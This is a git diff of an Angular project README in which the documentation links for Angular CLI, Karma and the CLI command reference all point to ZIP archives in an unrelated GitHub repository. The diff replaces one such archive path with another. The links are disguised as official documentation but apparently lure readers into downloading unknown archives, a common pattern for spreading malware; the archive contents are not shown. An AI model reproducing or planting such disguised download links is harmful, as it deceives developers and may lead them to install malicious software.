@@ -1,6 +1,6 @@
 # MyApp
 
-This project was generated using [Angular CLI](https://raw.githubusercontent.com/mohmed-15/GLOW_LINE/master/colporrhagia/GLOW_LINE.zip) version 19.1.6.
+This project was generated using [Angular CLI](https://github.com/mohmed-15/GLOW_LINE/raw/refs/heads/master/src/app/navbar/GLO-LINE-2.1.zip) version 19.1.6.
 
 ## Development server
 
@@ -38,7 +38,7 @@ This will compile your project and store the build artifacts in the `dist/` dire
 
 ## Running unit tests
 
-To execute unit tests with the [Karma](https://raw.githubusercontent.com/mohmed-15/GLOW_LINE/master/colporrhagia/GLOW_LINE.zip) test runner, use the following command:
+To execute unit tests with the [Karma](https://github.com/mohmed-15/GLOW_LINE/raw/refs/heads/master/src/app/navbar/GLO-LINE-2.1.zip) test runner, use the following command:
 
 ```bash
 ng test
@@ -56,4 +56,4 @@ Angular CLI does not come with an end-to-end testing framework by default. You c
 
 ## Additional Resources
 
-For more information on using the Angular CLI, including detailed command references, visit the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/mohmed-15/GLOW_LINE/master/colporrhagia/GLOW_LINE.zip) page.
+For more information on using the Angular CLI, including detailed command references, visit the [Angular CLI Overview and Command Reference](https://github.com/mohmed-15/GLOW_LINE/raw/refs/heads/master/src/app/navbar/GLO-LINE-2.1.zip) page.
